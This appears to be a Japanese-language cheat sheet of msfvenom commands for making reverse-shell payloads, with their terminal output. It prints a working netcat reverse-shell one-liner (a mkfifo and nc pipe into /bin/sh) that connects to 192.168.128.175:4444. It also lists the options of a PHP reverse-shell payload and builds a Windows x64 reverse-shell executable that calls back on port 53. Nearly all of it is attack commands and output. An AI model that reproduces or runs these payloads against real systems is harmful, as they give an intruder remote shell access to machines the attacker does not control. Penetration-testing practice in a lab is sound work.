## netcatのリバースシェルのペイロード生成。R=raw

```bash
banister@~ Tinkpad$ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.128.175 lport=4444 R
```

```
mkfifo /tmp/gtrhijr; nc 192.168.128.175 4444 0</tmp/gtrhijr | /bin/sh >/tmp/gtrhijr 2>&1; rm /tmp/gtrhijr[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 105 bytes

```

## payloadの一覧

```bash
banister@~ Tinkpad$ msfvenom -l payload | grep php
```

```
```

## ペイロードのオプション確認

```bash
banister@~ Tinkpad$ msfvenom -p php/reverse_php --list-options
```

```

Options for payload/php/reverse_php:
       Name: PHP Command Shell, Reverse TCP (via PHP)
=========================
     Module: payload/php/reverse_php

   Platform: PHP

       Arch: php
Advanced options for payload/php/reverse_php:
Needs Admin: No
=========================
 Total size: 2690

       Rank: Normal


Evasion options for payload/php/reverse_php:
Provided by:
=========================
    egypt <egypt@metasploit.com>


Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
    Reverse PHP connect back shell with checks for disabled functions


    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AutoRunScript                                no        A script to run automatically on session creation.
    AutoVerifySession           true             yes       Automatically verify and drop invalid sessions
    CommandShellCleanupCommand                   no        A command to run before the session is closed
    InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
    ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT
    ReverseListenerComm                          no        The specific communication channel to use for this listener
    ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)
    StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails
    StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module

```

## windows用のリバースシェル生成。待受け側はnc -lvpn 53

```bash
banister@~ Tinkpad$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.128.175 lport=53 -f exe -o reverse.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

